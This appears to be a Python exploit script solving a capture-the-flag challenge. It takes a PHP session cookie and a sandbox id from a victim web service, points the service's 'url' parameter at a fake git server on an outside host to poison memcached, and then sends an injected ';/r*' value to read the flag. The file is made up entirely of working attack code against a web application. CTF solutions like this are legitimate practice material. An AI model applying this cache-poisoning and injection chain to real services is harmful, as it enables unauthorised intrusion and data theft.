import re
import requests
import sys


VICTIM_PORT = 8010
FAKE_GIT_ADDR = 'https://tls.exmaple.com:11211/'


if __name__ == '__main__':
    # victim_host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    # victim_addr = f'http://{victim_host}:{VICTIM_PORT}/'
    victim_addr = "http://172.16.57.3:8010/"

    response = requests.get(victim_addr)
    cookies = response.cookies
    sandbox_id = re.search('<code>(.*?)</code>', response.text).group(1).rstrip('=')

    print(f'Got PHP cookie {cookies["PHPSESSID"]} and sandbox id {sandbox_id}')
    # print(f'{FAKE_GIT_ADDR}{sandbox_id}')

    # print(f'Poisoning memcached')
    response = requests.get(victim_addr, cookies=cookies, params={
        'url': f'{FAKE_GIT_ADDR}{sandbox_id}',
    })
    assert 'analysis failed' in response.text, f'Got an unexpected response: {response.text}'

    print(f'Memcached is poisoned, reading flag')
    response = requests.get(victim_addr, cookies=cookies, params={
        'url': ';/r*',
    })
    print(response.text)
    assert 'hxp{' in response.text, f'Unexpected response: {response.text}'
    print(re.search('(hxp{.*})', response.text).group(1))
